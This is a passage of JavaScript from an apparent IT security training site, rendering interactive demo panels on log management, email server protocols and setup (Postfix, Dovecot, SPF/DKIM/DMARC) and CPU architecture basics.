                <button class="demo-btn demo-btn-sm active" data-t="elk">ELK Stack</button>
                <button class="demo-btn demo-btn-sm" data-t="splunk">Splunk</button>
                <button class="demo-btn demo-btn-sm" data-t="compare">Compare</button>
            </div>
            <div id="log4Out" style="background:#0d1117;color:#58a6ff;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            elk: 'ELK STACK (Elasticsearch, Logstash, Kibana):\n\n┌─────────────────────────────────────┐\n│  Beats → Logstash → Elasticsearch  │\n│                        ↓           │\n│                     Kibana         │\n└─────────────────────────────────────┘\n\n📦 Components:\n  • Filebeat: Ship log files\n  • Logstash: Parse & transform\n  • Elasticsearch: Store & search\n  • Kibana: Visualize & dashboards\n\n✓ Open source (basic)\n✓ Highly scalable\n✓ Flexible\n✗ Complex to manage\n✗ Resource intensive',
            splunk: 'SPLUNK:\n\n🏢 Enterprise SIEM Leader\n\n✓ Features:\n  • Powerful search language (SPL)\n  • Pre-built apps & integrations\n  • Machine learning\n  • Easy setup\n  • Great dashboards\n\n💰 Pricing:\n  • Per GB/day ingested\n  • Can be VERY expensive\n  • Free tier: 500MB/day\n\nSearch example:\n  index=web sourcetype=access_combined\n  | stats count by status\n  | where status >= 400\n\n✗ Cost at scale\n✗ Vendor lock-in',
            compare: 'COMPARISON:\n\n┌──────────────┬─────────────┬──────────────┐\n│ Feature      │ ELK         │ Splunk       │\n├──────────────┼─────────────┼──────────────┤\n│ Cost         │ Free(basic) │ $$$ per GB   │\n│ Setup        │ Complex     │ Easy         │\n│ Scalability  │ Excellent   │ Excellent    │\n│ Search       │ Lucene/KQL  │ SPL (better) │\n│ Support      │ Community   │ Enterprise   │\n│ Learning     │ Steeper     │ Easier       │\n│ Flexibility  │ Higher      │ More polished│\n└──────────────┴─────────────┴──────────────┘\n\nOther options:\n  • Graylog (middle ground)\n  • Loki (Grafana)\n  • Wazuh (security focus)'
        };
        $('#log4Out').textContent = data.elk;
        $$('#log4Btns .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#log4Btns .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#log4Out').textContent = data[b.dataset.t];
            };
        });
    }

    function demoSecurityVsPrivacy(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-warning">BALANCE</span><span class="demo-title">Security vs Privacy in Logging</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="log5Btns">
                <button class="demo-btn demo-btn-sm active" data-v="tension">The Tension</button>
                <button class="demo-btn demo-btn-sm" data-v="gdpr">GDPR & Logs</button>
                <button class="demo-btn demo-btn-sm" data-v="balance">Best Practices</button>
            </div>
            <div id="log5Out" style="background:#2d1b1b;color:#ffa657;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            tension: 'SECURITY vs PRIVACY TENSION:\n\n🛡️ SECURITY wants:\n  • Log everything\n  • Keep logs forever\n  • Detailed user tracking\n  • Full packet captures\n\n🔒 PRIVACY wants:\n  • Minimize data collection\n  • Delete data quickly\n  • Anonymize where possible\n  • User consent\n\n⚖️ The Challenge:\n  More logging = Better security detection\n  More logging = More privacy risk\n\nExample: IP addresses\n  Security: Need for threat detection\n  Privacy: Personal data under GDPR',
            gdpr: 'GDPR & LOG MANAGEMENT:\n\n📋 GDPR Requirements:\n  • Data minimization\n  • Purpose limitation\n  • Storage limitation\n  • Right to erasure\n\n⚠️ Logs often contain PII:\n  • IP addresses\n  • User IDs\n  • Email addresses\n  • Location data\n\n✓ Compliance strategies:\n  • Define retention periods\n  • Document purpose for each log\n  • Implement auto-deletion\n  • Pseudonymize where possible\n  • Hash/encrypt sensitive fields\n\n❌ Cannot delete:\n  • Security incident evidence\n  • Legal hold requirements',
            balance: 'BEST PRACTICES:\n\n1️⃣ Log what you NEED:\n   Don\'t log credit cards, passwords\n\n2️⃣ Define retention policies:\n   • Security logs: 1 year\n   • Access logs: 90 days\n   • Debug logs: 30 days\n\n3️⃣ Pseudonymize:\n   User123 instead of john@example.com\n   Hash IPs for analytics\n\n4️⃣ Access controls:\n   Restrict who can view logs\n   Audit log access itself\n\n5️⃣ Document everything:\n   What, why, how long, who can access\n\n6️⃣ Regular review:\n   Delete what you don\'t need'
        };
        $('#log5Out').textContent = data.tension;
        $$('#log5Btns .demo-btn').forEach(b => {
            if(b.dataset.v) b.onclick = () => {
                $$('#log5Btns .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#log5Out').textContent = data[b.dataset.v];
            };
        });
    }

    function demoLogBestPractices(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-success">BEST</span><span class="demo-title">Log Management Best Practices</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="log6Btns">
                <button class="demo-btn demo-btn-sm active" data-p="what">What to Log</button>
                <button class="demo-btn demo-btn-sm" data-p="format">Format</button>
                <button class="demo-btn demo-btn-sm" data-p="alerts">Alerting</button>
            </div>
            <div id="log6Out" style="background:#1a2e1a;color:#7ee787;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            what: 'WHAT TO LOG (Security Focus):\n\n✅ ALWAYS LOG:\n  • Authentication events (success/fail)\n  • Authorization changes\n  • System/app startup/shutdown\n  • Errors and exceptions\n  • Admin actions\n  • Data access (sensitive)\n  • Network connections\n\n❌ NEVER LOG:\n  • Passwords (even hashed!)\n  • Credit card numbers\n  • Social security numbers\n  • API keys / secrets\n  • Health information\n\n⚠️ CONSIDER:\n  • User input (sanitize first)\n  • Session tokens (partial OK)',
            format: 'LOG FORMAT STANDARDS:\n\n📝 Structured logging (recommended):\n{\n  "timestamp": "2024-02-12T10:30:00Z",\n  "level": "ERROR",\n  "service": "auth-service",\n  "event": "login_failed",\n  "user_id": "user_123",\n  "ip": "192.168.1.100",\n  "reason": "invalid_password",\n  "trace_id": "abc123"\n}\n\n✓ Benefits:\n  • Machine-parseable (JSON)\n  • Consistent fields\n  • Easy to search/filter\n  • Correlate with trace_id\n\n📋 Include:\n  Timestamp, Level, Source, Event, Context',
            alerts: 'ALERTING RULES:\n\n🚨 Critical Alerts (immediate):\n  • 5+ failed logins same user\n  • Root/admin login from new IP\n  • Database query with UNION SELECT\n  • Outbound connection to known bad IP\n\n⚠️ Warning Alerts (investigate):\n  • Unusual data volume transferred\n  • Access outside business hours\n  • New admin user created\n  • Service account used interactively\n\n📊 Thresholds:\n  • Static: >100 errors in 5 min\n  • Dynamic: 3x normal error rate\n  • Anomaly: ML-based deviation\n\n💡 Avoid alert fatigue!\n   Tune thresholds, reduce noise'
        };
        $('#log6Out').textContent = data.what;
        $$('#log6Btns .demo-btn').forEach(b => {
            if(b.dataset.p) b.onclick = () => {
                $$('#log6Btns .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#log6Out').textContent = data[b.dataset.p];
            };
        });
    }

    // C7L29-L35: Email Server Lessons (unique demos)
    function demoEmailServerIntro(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">EMAIL</span><span class="demo-title">Email Server Introduction</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="eml1Btns">
                <button class="demo-btn demo-btn-sm active" data-e="what">What is Email?</button>
                <button class="demo-btn demo-btn-sm" data-e="components">Components</button>
                <button class="demo-btn demo-btn-sm" data-e="flow">Flow</button>
            </div>
            <div id="eml1Out" style="background:#1a1a2e;color:#ffa657;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            what: 'WHAT IS AN EMAIL SERVER?\n\n📧 A system that:\n  • Sends emails (SMTP)\n  • Receives emails (SMTP)\n  • Stores emails (mailbox)\n  • Allows retrieval (IMAP/POP3)\n\n🌐 Every email you send:\n  Your client → Your server → Their server → Their client\n\n📊 Scale:\n  • 300+ billion emails sent daily\n  • Gmail: 1.8 billion users\n  • Business critical communication\n\n🔧 Self-hosted examples:\n  • Postfix (MTA)\n  • Dovecot (IMAP/POP3)\n  • Microsoft Exchange',
            components: 'EMAIL SERVER COMPONENTS:\n\n┌─────────────────────────────────────┐\n│ MUA (Mail User Agent)              │\n│ Outlook, Thunderbird, Gmail web    │\n├─────────────────────────────────────┤\n│ MSA (Mail Submission Agent)        │\n│ Accepts mail from MUA (port 587)   │\n├─────────────────────────────────────┤\n│ MTA (Mail Transfer Agent)          │\n│ Routes mail between servers        │\n│ Postfix, Sendmail, Exchange        │\n├─────────────────────────────────────┤\n│ MDA (Mail Delivery Agent)          │\n│ Delivers to mailbox (procmail)     │\n├─────────────────────────────────────┤\n│ IMAP/POP3 Server                   │\n│ User retrieves email (Dovecot)     │\n└─────────────────────────────────────┘',
            flow: 'EMAIL FLOW:\n\n1. Alice writes email in Outlook\n         ↓\n2. Outlook → Alice\'s SMTP (port 587)\n         ↓\n3. DNS lookup: MX record for bob.com\n         ↓\n4. Alice\'s MTA → Bob\'s MTA (port 25)\n         ↓\n5. Bob\'s MDA → Bob\'s mailbox\n         ↓\n6. Bob\'s IMAP server serves mail\n         ↓\n7. Bob opens email in client\n\n⏱️ Usually seconds, can queue for hours\n🔄 May pass through multiple MTAs'
        };
        $('#eml1Out').textContent = data.what;
        $$('#eml1Btns .demo-btn').forEach(b => {
            if(b.dataset.e) b.onclick = () => {
                $$('#eml1Btns .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#eml1Out').textContent = data[b.dataset.e];
            };
        });
    }

    function demoSMTPIMAPPOP3(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-success">PROTOCOLS</span><span class="demo-title">SMTP, IMAP, POP3</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="eml2Btns">
                <button class="demo-btn demo-btn-sm active" data-p="smtp">SMTP</button>
                <button class="demo-btn demo-btn-sm" data-p="imap">IMAP</button>
                <button class="demo-btn demo-btn-sm" data-p="pop3">POP3</button>
                <button class="demo-btn demo-btn-sm" data-p="compare">Compare</button>
            </div>
            <div id="eml2Out" style="background:#0d1117;color:#79c0ff;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            smtp: 'SMTP (Simple Mail Transfer Protocol):\n\n📤 Purpose: SENDING email\n\n🔌 Ports:\n  25  - Server to server\n  587 - Client to server (submission)\n  465 - SMTP over SSL (deprecated)\n\n📝 SMTP Session:\nC: HELO client.example.com\nS: 250 Hello\nC: MAIL FROM:<alice@example.com>\nS: 250 OK\nC: RCPT TO:<bob@example.com>\nS: 250 OK\nC: DATA\nS: 354 Start mail input\nC: Subject: Hello\nC: Hi Bob!\nC: .\nS: 250 Message accepted',
            imap: 'IMAP (Internet Message Access Protocol):\n\n📥 Purpose: ACCESS email\n\n🔌 Ports:\n  143 - IMAP (plaintext)\n  993 - IMAPS (TLS)\n\n✓ Features:\n  • Mail stays on server\n  • Multiple device sync\n  • Server-side search\n  • Folders/labels\n  • Partial fetch (headers only)\n\n📱 Use case:\n  Phone, laptop, web - all synced\n  Delete on one = deleted everywhere\n\n👍 Recommended for most users',
            pop3: 'POP3 (Post Office Protocol v3):\n\n📥 Purpose: DOWNLOAD email\n\n🔌 Ports:\n  110 - POP3 (plaintext)\n  995 - POP3S (TLS)\n\n✓ Features:\n  • Download and delete\n  • Simple protocol\n  • Works offline\n\n❌ Limitations:\n  • Single device usually\n  • No server-side folders\n  • No sync between devices\n\n📦 Use case:\n  Download emails for archive\n  Limited storage quota\n  Single device user',
            compare: 'IMAP vs POP3:\n\n┌────────────┬──────────────┬──────────────┐\n│ Feature    │ IMAP         │ POP3         │\n├────────────┼──────────────┼──────────────┤\n│ Storage    │ Server       │ Local        │\n│ Sync       │ Yes          │ No           │\n│ Devices    │ Multiple     │ Single       │\n│ Folders    │ Yes          │ No           │\n│ Offline    │ Partial      │ Full         │\n│ Bandwidth  │ Higher       │ Lower        │\n│ Complexity │ Higher       │ Lower        │\n│ Best for   │ Most users   │ Archiving    │\n└────────────┴──────────────┴──────────────┘\n\n🏆 Winner: IMAP (for most cases)'
        };
        $('#eml2Out').textContent = data.smtp;
        $$('#eml2Btns .demo-btn').forEach(b => {
            if(b.dataset.p) b.onclick = () => {
                $$('#eml2Btns .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#eml2Out').textContent = data[b.dataset.p];
            };
        });
    }

    function demoEmailSendProcess(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">PROCESS</span><span class="demo-title">Email Send Process</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="eml3Btns">
                <button class="demo-btn demo-btn-sm active" data-s="steps">Steps</button>
                <button class="demo-btn demo-btn-sm" data-s="dns">DNS Lookup</button>
                <button class="demo-btn demo-btn-sm" data-s="queue">Queue</button>
            </div>
            <div id="eml3Out" style="background:#1e1e1e;color:#ce9178;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            steps: 'EMAIL SEND STEPS:\n\n1️⃣ Compose: User writes email\n\n2️⃣ Submit: Client → MSA (port 587)\n   Authentication required\n\n3️⃣ DNS Lookup: Find recipient\'s MX\n   dig gmail.com MX\n\n4️⃣ Connect: MTA → Recipient MTA (port 25)\n\n5️⃣ Authenticate: SPF, DKIM, DMARC checks\n\n6️⃣ Deliver: MDA stores in mailbox\n\n7️⃣ Notify: Recipient notified (push/pull)\n\n⏱️ Typical time: 1-30 seconds\n📤 May retry for 1-5 days if fails',
            dns: 'DNS MX LOOKUP:\n\n$ dig gmail.com MX +short\n\n5  gmail-smtp-in.l.google.com.\n10 alt1.gmail-smtp-in.l.google.com.\n20 alt2.gmail-smtp-in.l.google.com.\n30 alt3.gmail-smtp-in.l.google.com.\n40 alt4.gmail-smtp-in.l.google.com.\n\n🔢 Priority (lower = preferred):\n   Try 5 first, then 10, then 20...\n\n🔄 Redundancy:\n   If priority 5 is down, try 10\n   Multiple servers = high availability\n\n💡 No MX record?\n   Fall back to A record',
            queue: 'EMAIL QUEUE:\n\n📬 Why queue?\n  • Recipient server down\n  • Rate limiting\n  • Greylisting\n  • Network issues\n\n⏱️ Retry schedule (typical):\n  • Immediate retry\n  • 15 minutes\n  • 30 minutes\n  • 1 hour\n  • 4 hours\n  • Keep trying for 1-5 days\n\n❌ After max retries:\n  • Bounce message (NDR)\n  • "Delivery failed permanently"\n\n# View Postfix queue\n$ mailq\n$ postqueue -p'
        };
        $('#eml3Out').textContent = data.steps;
        $$('#eml3Btns .demo-btn').forEach(b => {
            if(b.dataset.s) b.onclick = () => {
                $$('#eml3Btns .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#eml3Out').textContent = data[b.dataset.s];
            };
        });
    }

    function demoSpamFilters(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-warning">SPAM</span><span class="demo-title">Spam Filtering</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="eml4Btns">
                <button class="demo-btn demo-btn-sm active" data-f="methods">Methods</button>
                <button class="demo-btn demo-btn-sm" data-f="spf">SPF/DKIM/DMARC</button>
                <button class="demo-btn demo-btn-sm" data-f="bayesian">Bayesian</button>
            </div>
            <div id="eml4Out" style="background:#2d1b1b;color:#f97583;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            methods: 'SPAM FILTERING METHODS:\n\n📋 Blacklists (RBL/DNSBL):\n  • Known spam IPs\n  • Spamhaus, SpamCop\n  • Query: 1.2.3.4.bl.spamhaus.org\n\n📝 Content Filtering:\n  • Keyword matching\n  • Regex patterns\n  • Link analysis\n\n🤖 Machine Learning:\n  • Train on spam/ham\n  • Probabilistic scoring\n\n🔐 Authentication:\n  • SPF, DKIM, DMARC\n  • Verify sender identity\n\n⚖️ Scoring:\n  SpamAssassin: Score > 5 = spam\n  Multiple factors combined',
            spf: 'SPF / DKIM / DMARC:\n\n📝 SPF (Sender Policy Framework):\n   TXT record: "v=spf1 include:_spf.google.com ~all"\n   "Only these IPs can send for our domain"\n\n🔏 DKIM (DomainKeys Identified Mail):\n   Cryptographic signature in email header\n   Proves email wasn\'t modified in transit\n\n🛡️ DMARC (Domain Message Auth):\n   TXT record: "v=DMARC1; p=reject; rua=mailto:.."\n   Policy: What to do if SPF/DKIM fails\n   p=none (report), p=quarantine, p=reject\n\n✓ All three = best protection\n✗ Many domains still don\'t use DMARC',
            bayesian: 'BAYESIAN SPAM FILTERING:\n\n🧠 Machine learning approach:\n\n1. Train on known spam/ham emails\n\n2. Calculate word probabilities:\n   P("viagra" | spam) = 0.95\n   P("meeting" | ham) = 0.80\n\n3. For new email, combine probabilities:\n   Words: "free viagra now"\n   P(spam | words) = very high → SPAM\n\n✓ Adapts to your mail\n✓ Learns over time\n✓ Hard to game\n\n🔧 SpamAssassin uses Bayesian:\n   sa-learn --spam mailbox\n   sa-learn --ham mailbox'
        };
        $('#eml4Out').textContent = data.methods;
        $$('#eml4Btns .demo-btn').forEach(b => {
            if(b.dataset.f) b.onclick = () => {
                $$('#eml4Btns .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#eml4Out').textContent = data[b.dataset.f];
            };
        });
    }

    function demoEmailResponseCodes(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">CODES</span><span class="demo-title">SMTP Response Codes</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="eml5Btns">
                <button class="demo-btn demo-btn-sm active" data-c="2xx">2xx Success</button>
                <button class="demo-btn demo-btn-sm" data-c="4xx">4xx Temp Fail</button>
                <button class="demo-btn demo-btn-sm" data-c="5xx">5xx Perm Fail</button>
            </div>
            <div id="eml5Out" style="background:#0d1117;color:#7ee787;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            '2xx': '2xx SUCCESS CODES:\n\n✅ 220 Service ready\n   Server greeting\n   "220 mail.example.com ESMTP Postfix"\n\n✅ 221 Closing connection\n   Successful QUIT\n\n✅ 250 OK / Action completed\n   Most common success\n   "250 2.1.0 Ok"\n\n✅ 251 User not local, forwarding\n   Will forward to another address\n\n✅ 252 Cannot verify user\n   Will try delivery anyway\n\n✅ 354 Start mail input\n   Ready for message body\n   "354 End data with <CR><LF>.<CR><LF>"',
            '4xx': '4xx TEMPORARY FAILURE:\n\n⚠️ 421 Service not available\n   Server shutting down\n   "Try again later"\n\n⚠️ 450 Mailbox unavailable\n   Busy or policy restriction\n   WILL RETRY\n\n⚠️ 451 Local error\n   Processing problem\n   "451 Temporary local problem"\n\n⚠️ 452 Insufficient storage\n   Disk full / quota exceeded\n\n⚠️ 455 Server unable to accept parameters\n\n💡 4xx = Try again!\n   Server will retry for 1-5 days',
            '5xx': '5xx PERMANENT FAILURE:\n\n❌ 550 Mailbox not found\n   "550 User unknown"\n   NO RETRY\n\n❌ 551 User not local\n   Try another address\n\n❌ 552 Message too large\n   Exceeded size limit\n\n❌ 553 Mailbox name invalid\n   Bad syntax\n\n❌ 554 Transaction failed\n   Rejected (spam, policy)\n   "554 5.7.1 Rejected by spam filter"\n\n❌ 556 Domain does not accept mail\n   Null MX record\n\n💀 5xx = Give up!\n   Bounce message to sender'
        };
        $('#eml5Out').textContent = data['2xx'];
        $$('#eml5Btns .demo-btn').forEach(b => {
            if(b.dataset.c) b.onclick = () => {
                $$('#eml5Btns .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#eml5Out').textContent = data[b.dataset.c];
            };
        });
    }

    function demoMIMEEmail(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-success">MIME</span><span class="demo-title">MIME & Email Format</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="eml6Btns">
                <button class="demo-btn demo-btn-sm active" data-m="what">What is MIME?</button>
                <button class="demo-btn demo-btn-sm" data-m="headers">Headers</button>
                <button class="demo-btn demo-btn-sm" data-m="types">Content Types</button>
            </div>
            <div id="eml6Out" style="background:#1a1a2e;color:#dcdcaa;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            what: 'WHAT IS MIME?\n\n📧 Multipurpose Internet Mail Extensions\n\n🎯 Purpose:\n  Original email = ASCII text only\n  MIME = attachments, HTML, non-ASCII\n\n📎 MIME enables:\n  • HTML emails\n  • File attachments\n  • Images inline\n  • International characters (UTF-8)\n  • Multiple parts (text + HTML)\n\n📝 MIME Header:\nContent-Type: multipart/mixed;\n    boundary="----=_Part_123"\nMIME-Version: 1.0\n\nEverything you attach uses MIME!',
            headers: 'EMAIL HEADERS:\n\nFrom: alice@example.com\nTo: bob@example.com\nCc: carol@example.com\nBcc: (hidden)\nSubject: Hello!\nDate: Mon, 12 Feb 2024 10:30:00 -0500\nMessage-ID: <unique-id@example.com>\nMIME-Version: 1.0\nContent-Type: text/plain; charset="UTF-8"\n\n🔍 Security headers:\nReceived: from ... (trace route)\nAuthentication-Results: spf=pass; dkim=pass\nX-Spam-Score: 1.2\nDKIM-Signature: v=1; a=rsa-sha256; ...\n\n💡 View headers: "Show Original" in email client',
            types: 'MIME CONTENT TYPES:\n\n📝 Text:\n  text/plain - Plain text\n  text/html - HTML email\n\n🖼️ Images:\n  image/jpeg, image/png, image/gif\n\n📎 Applications:\n  application/pdf\n  application/zip\n  application/octet-stream (binary)\n\n📧 Multipart:\n  multipart/mixed - Attachments\n  multipart/alternative - Text + HTML\n  multipart/related - HTML + inline images\n\n🔒 Encoding:\n  Content-Transfer-Encoding: base64\n  Binary data → ASCII safe text'
        };
        $('#eml6Out').textContent = data.what;
        $$('#eml6Btns .demo-btn').forEach(b => {
            if(b.dataset.m) b.onclick = () => {
                $$('#eml6Btns .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#eml6Out').textContent = data[b.dataset.m];
            };
        });
    }

    function demoEmailServerSetup(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">SETUP</span><span class="demo-title">Email Server Setup</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="eml7Btns">
                <button class="demo-btn demo-btn-sm active" data-u="postfix">Postfix</button>
                <button class="demo-btn demo-btn-sm" data-u="dovecot">Dovecot</button>
                <button class="demo-btn demo-btn-sm" data-u="dns">DNS Records</button>
            </div>
            <div id="eml7Out" style="background:#1e1e1e;color:#4ec9b0;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            postfix: 'POSTFIX (MTA) SETUP:\n\n# Install\nsudo apt install postfix\n\n# /etc/postfix/main.cf\nmyhostname = mail.example.com\nmydomain = example.com\nmyorigin = $mydomain\ninet_interfaces = all\nmydestination = $myhostname, localhost.$mydomain, $mydomain\nsmtpd_tls_cert_file = /etc/ssl/certs/mail.pem\nsmtpd_tls_key_file = /etc/ssl/private/mail.key\nsmtpd_use_tls = yes\nsmtpd_sasl_auth_enable = yes\n\n# Restart\nsudo systemctl restart postfix\n\n# Test\ntelnet localhost 25\nEHLO test',
            dovecot: 'DOVECOT (IMAP/POP3) SETUP:\n\n# Install\nsudo apt install dovecot-imapd dovecot-pop3d\n\n# /etc/dovecot/conf.d/10-mail.conf\nmail_location = maildir:~/Maildir\n\n# /etc/dovecot/conf.d/10-auth.conf\nauth_mechanisms = plain login\n\n# /etc/dovecot/conf.d/10-ssl.conf\nssl = required\nssl_cert = </etc/ssl/certs/mail.pem\nssl_key = </etc/ssl/private/mail.key\n\n# Restart\nsudo systemctl restart dovecot\n\n# Test\nopenssl s_client -connect localhost:993',
            dns: 'DNS RECORDS FOR EMAIL:\n\n# MX Record (where to send mail)\nexample.com. MX 10 mail.example.com.\n\n# A Record (mail server IP)\nmail.example.com. A 93.184.216.34\n\n# SPF (who can send)\nexample.com. TXT "v=spf1 ip4:93.184.216.34 ~all"\n\n# DKIM (signature verification)\ndefault._domainkey.example.com. TXT "v=DKIM1; k=rsa; p=..."\n\n# DMARC (policy)\n_dmarc.example.com. TXT "v=DMARC1; p=quarantine; rua=mailto:admin@example.com"\n\n# Reverse DNS (PTR)\n34.216.184.93.in-addr.arpa. PTR mail.example.com.'
        };
        $('#eml7Out').textContent = data.postfix;
        $$('#eml7Btns .demo-btn').forEach(b => {
            if(b.dataset.u) b.onclick = () => {
                $$('#eml7Btns .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#eml7Out').textContent = data[b.dataset.u];
            };
        });
    }

    // Keep original generic functions for backward compatibility
    function demoDNSServer(pane) { demoDNSServerIntro(pane); }
    function demoLogServer(pane) { demoLogServerIntro(pane); }
    function demoEmailServer(pane) { demoEmailServerIntro(pane); }

    /* ============================================================
       C8: ADVANCED HARDWARE DEMOS - UNIQUE PER LESSON
       ============================================================ */

    // C8 Lesson 1: cpu-arch-intro - Introduction to CPU Architecture
    function demoCPUArchIntro(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">Introduction to CPU Architecture</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="cpuIntroTabs">
                <button class="demo-btn demo-btn-sm active" data-t="what">What is CPU?</button>
                <button class="demo-btn demo-btn-sm" data-t="isa">ISA Overview</button>
                <button class="demo-btn demo-btn-sm" data-t="archs">x86 vs ARM</button>
            </div>
            <div id="cpuIntroOut" style="background:#1e1e1e;color:#569cd6;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            what: 'WHAT IS A CPU?\n\nCentral Processing Unit - The "brain" of the computer\n\n┌─────────────────────────────────────┐\n│           CPU OVERVIEW              │\n├─────────────────────────────────────┤\n│                                     │\n│  • Executes program instructions    │\n│  • Performs arithmetic operations   │\n│  • Controls data flow               │\n│  • Manages system resources         │\n│                                     │\n├─────────────────────────────────────┤\n│ KEY METRICS:                        │\n│  Clock Speed: 3.5 GHz = 3.5B cycles/sec │\n│  Cores: 4-64 parallel processors    │\n│  Cache: Fast on-chip memory         │\n│  TDP: Power consumption (Watts)     │\n└─────────────────────────────────────┘\n\n💡 Security Relevance: Understanding CPU = Understanding exploits',
            isa: 'INSTRUCTION SET ARCHITECTURE (ISA):\n\nThe "language" the CPU understands\n\n┌─────────────────────────────────────┐\n│  High-Level Code (C/Python)         │\n├─────────────────────────────────────┤\n│          ↓ Compiler                 │\n├─────────────────────────────────────┤\n│  Assembly Language (mov, add, jmp)  │\n├─────────────────────────────────────┤\n│          ↓ Assembler                │\n├─────────────────────────────────────┤\n│  Machine Code (0s and 1s)           │\n├─────────────────────────────────────┤\n│          ↓ CPU Executes             │\n└─────────────────────────────────────┘\n\nCISC vs RISC:\n  CISC (x86): Complex, many instructions\n  RISC (ARM): Simple, fewer instructions',
            archs: 'x86-64 vs ARM ARCHITECTURE:\n\n┌────────────────┬────────────────────┐\n│    x86-64      │      ARM           │\n├────────────────┼────────────────────┤\n│ Intel, AMD     │ Apple, Qualcomm    │\n│ Desktops, Srv  │ Mobile, Mac M-chip │\n│ CISC design    │ RISC design        │\n│ Complex instr  │ Simple, fast instr │\n│ Higher power   │ Low power          │\n│ Legacy compat  │ Modern efficiency  │\n└────────────────┴────────────────────┘\n\nSecurity Professional Impact:\n• Different exploit techniques per arch\n• ARM growing in servers (AWS Graviton)\n• Must understand both for modern security\n• Malware targets specific architectures'
        };
        $('#cpuIntroOut').textContent = data.what;
        $$('#cpuIntroTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#cpuIntroTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#cpuIntroOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C8 Lesson 2: cpu-components-adv - Advanced CPU Components
    function demoCPUComponentsAdv(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">Advanced CPU Components</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="cpuCompTabs">
